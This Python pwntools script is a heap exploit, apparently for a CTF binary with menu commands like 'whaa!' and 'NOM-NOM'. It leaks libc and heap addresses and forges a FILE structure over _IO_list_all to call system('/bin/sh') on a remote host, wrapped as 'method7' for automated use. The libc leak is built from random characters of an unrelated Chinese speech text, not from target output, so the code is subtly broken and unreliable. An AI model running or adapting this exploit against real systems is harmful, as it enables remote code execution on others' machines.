# coding=utf-8
from pwn import *
from random import randint

strings = "今年是我国改革开放周年也是海南建省办经济特区周年今天我们在这里隆重集会庆祝海南建省办经济特区周年就是要充分肯定经济特区建设的历史功绩深刻总结经济特区建设的宝贵经验全面贯彻党的十九大精神和新时代中国特色社会主义思想在新时代新起点上继续把全面深化改革推向前进为实现两个一百年奋斗目标实现中华民族伟大复兴的中国梦提供强大动力"
LOCAL = False


def alloc(size):
    target.sendline("whaa!")
    target.sendline(size)


def writef(size, data):
    target.sendline("<spill>")
    target.sendline(size)
    target.sendline(data)


def printf(size):
    target.sendline("mommy?")
    target.sendline(size)


# target.recvuntil("NOM-NOM\n")

def delf(size):
    target.sendline("NOM-NOM")
    target.sendline(size)


def pwn():
    # alloc("wi" + "wa" * 7 + "a" )
    alloc("wi" + "wa" * 10 + "a")
    alloc("wi" * 5 + "a")
    alloc("wi" * 5 + "a")
    delf("wi" + "wa" * 4 + "wb")
    printf("wi" + "wa" * 4 + "wb")
    leak = u64((strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
        randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[randint(1, len(strings))] + strings[
                    randint(1, len(strings))]).ljust(8, "\x00")) - 88
    libc_base = leak - 0x3c4b20
    vuln = libc_base + 0x3c4aed
    _IO_list_all = libc_base + 0x3c5520
    system = libc_base + 0x45390
    alloc("wi" + "wa" * 7 + "a")
    writef("\x00" * 100, "A" * 0x18 + p64(0x91) + "B" * 0x10)
    printf("wi" + "wa" * 4 + "wb")
    heap_base = u64(target.recv(6).ljust(8, "\x00")) - 0x20

    exp = "a" * 0xa0 + "/bin/sh\x00" + p64(0x61)
    exp += p64(0xdeadbeef) + p64(_IO_list_all - 0x10)
    exp += p64(2) + p64(3) + p64(0x200) * 8
    exp += p64(0) + p64(system)
    exp += p64(0) * 4
    exp += p64(heap_base + 0xb0 + 0x90) + p64(3) + p64(4) + p64(0) + p64(2) + p64(0) * 2
    exp += p64(heap_base + 0xb0 + 0x60)  # vtable

    writef("\x00" * 100, exp)
    target.sendline("whaa!")
    target.sendline("wiwi")



def method7(ip,port):
    global target
    log.info("Method 7 applied!")
    target = remote(ip, port)
    pwn()


if __name__ == "__main__":
    method7("127.0.0.1",80)
